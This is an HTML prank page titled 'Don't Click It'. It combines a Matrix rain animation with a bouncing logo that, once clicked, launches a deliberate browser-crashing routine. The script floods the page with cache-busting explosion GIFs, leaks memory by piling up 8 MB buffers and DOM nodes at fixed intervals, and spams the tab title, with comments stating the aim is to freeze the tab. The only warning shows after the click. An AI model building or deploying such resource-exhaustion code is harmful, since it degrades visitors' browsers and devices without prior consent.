<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matrix + Don't Click It</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background: black;
            color: #0f0;
            font-family: monospace;
            user-select: none;
            height: 100vh;
            position: relative;
        }
        canvas {
            display: block;
            position: fixed;
            inset: 0;
            z-index: 1;
        }
        #logo-container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 10;
            text-align: center;
        }
        #logo {
            pointer-events: auto;
            cursor: pointer;
            image-rendering: pixelated;
            width: min(260px, 55vw);
            max-width: 260px;
        }
        #crash-overlay {
            position: fixed;
            inset: 0;
            background: rgba(200,0,0,0.85);
            color: white;
            font-size: clamp(3rem, 8vw, 7rem);
            font-weight: bold;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 9999;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.5s;
        }
        .warning {
            font-size: clamp(1.5rem, 5vw, 3rem);
            color: #ff0;
            text-shadow: 0 0 16px #ff0;
            margin-top: 30px;
            animation: blink 1s infinite alternate;
        }
        @keyframes blink {
            from { opacity: 0.5; }
            to   { opacity: 1.0; }
        }
        .boom {
            position: absolute;
            width:  clamp(80px,  12vw,  280px);
            height: auto;
            pointer-events: none;
            z-index: 5;
            opacity: 0.92;
            transform: translate(-50%, -50%);
            image-rendering: pixelated;
        }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div id="logo-container">
        <img id="logo" src="https://dontclickit.org/wp-content/uploads/2024/05/cropped-dont-click-it-logo-1-330x109.png" alt="Don't Click It">
    </div>

    <div id="crash-overlay">
        <div>DESTRUCTION SEQUENCE INITIATED</div>
        <div class="warning">THIS TAB WILL BECOME UNRESPONSIVE</div>
    </div>

    <script>
        // ─── Matrix Rain (unchanged) ─────────────────────────────
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        let columns, drops;

        function resizeMatrix() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const fontSize = 16;
            columns = Math.floor(canvas.width / fontSize);
            drops = new Array(columns).fill(1);
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0,0,0,0.06)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.font = '16px monospace';
            const chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            for (let i = 0; i < columns; i++) {
                const txt = chars[Math.floor(Math.random() * chars.length)];
                const x = i * 16;
                const y = drops[i] * 16;
                ctx.fillText(txt, x, y);
                if (y > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }

        resizeMatrix();
        window.addEventListener('resize', resizeMatrix);
        setInterval(drawMatrix, 45);

        // ─── Bouncing logo (slightly simplified) ─────────────────
        const logoContainer = document.getElementById('logo-container');
        let logoX = window.innerWidth * 0.5 - 130;
        let logoY = window.innerHeight * 0.5 - 70;
        let vx = (Math.random() > 0.5 ? 1 : -1) * (1.8 + Math.random() * 1.4);
        let vy = (Math.random() > 0.5 ? 1 : -1) * (1.8 + Math.random() * 1.4);

        function animateLogo() {
            const w = logoContainer.offsetWidth  || 260;
            const h = logoContainer.offsetHeight || 140;
            logoX += vx;
            logoY += vy;
            if (logoX <= 0 || logoX + w >= window.innerWidth)  vx = -vx;
            if (logoY <= 0 || logoY + h >= window.innerHeight) vy = -vy;
            logoContainer.style.left = logoX + 'px';
            logoContainer.style.top  = logoY + 'px';
            requestAnimationFrame(animateLogo);
        }
        animateLogo();

        // ─── Nuke logic ──────────────────────────────────────────
        const overlay  = document.getElementById('crash-overlay');
        const logo     = document.getElementById('logo');
        const gifUrl   = "https://cache.magicmaman.com/data/fichiers/48/bombenucleaire.gif";

        let destroyed = false;

        logo.addEventListener('click', () => {
            if (destroyed) return;
            destroyed = true;

            logo.style.pointerEvents = 'none';
            logo.style.opacity = '0.4';
            overlay.style.opacity = '1';

            // Start spamming explosion GIFs very aggressively
            function spawnBoom() {
                if (!destroyed) return;

                const img = document.createElement('img');
                img.src = gifUrl + '?cache=' + Math.random(); // try to defeat cache
                img.className = 'boom';
                img.alt = "BOOM";

                // Random position
                const x = Math.random() * 100;
                const y = Math.random() * 100;
                img.style.left = x + 'vw';
                img.style.top  = y + 'vh';

                // Random slight rotation & scale variation
                const rot = (Math.random() - 0.5) * 60;
                const scale = 0.7 + Math.random() * 0.9;
                img.style.transform += ` rotate(${rot}deg) scale(${scale})`;

                document.body.appendChild(img);

                // Remove old images sometimes so we don't completely freeze instantly on some browsers
                if (Math.random() < 0.08) {
                    const old = document.querySelectorAll('.boom');
                    if (old.length > 120) {
                        old[Math.floor(Math.random()*old.length)].remove();
                    }
                }
            }

            // ≈ 1000 images / minute = ~16–17 per second
            const fastInterval = setInterval(spawnBoom, 60);

            // Even more aggressive burst every ~4 seconds
            setInterval(() => {
                for (let i = 0; i < 35; i++) {
                    setTimeout(spawnBoom, i * 30);
                }
            }, 4200);

            // Extra memory pressure attempt
            const leak = [];
            setInterval(() => {
                try {
                    leak.push(new ArrayBuffer(8 * 1024 * 1024));
                    leak.push(document.createElement('div')); // dom nodes too
                } catch {}
            }, 400);

            // Title spam for extra annoyance
            let counter = 0;
            setInterval(() => {
                document.title = "CRASHING".repeat((counter++ % 6) + 1) + " ☠ " + counter;
            }, 180);
        });
    </script>
</body>
</html>
